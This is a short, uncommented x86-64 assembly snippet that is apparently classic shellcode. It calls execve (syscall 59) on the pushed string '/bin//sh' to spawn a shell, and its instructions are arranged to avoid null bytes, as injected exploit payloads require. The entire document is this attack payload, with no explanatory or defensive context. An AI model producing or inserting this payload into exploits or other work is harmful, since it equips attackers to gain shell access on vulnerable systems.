_start:
	xor     rax, rax
	add     rax, 59                   
	xor     rdi, rdi
	push    rdi                        
	mov     rdi, 0x68732F2f6e69622F   
	push    rdi
	lea     rdi, [rsp]
	xor     rsi, rsi                  
	xor     rdx, rdx                  
	syscall
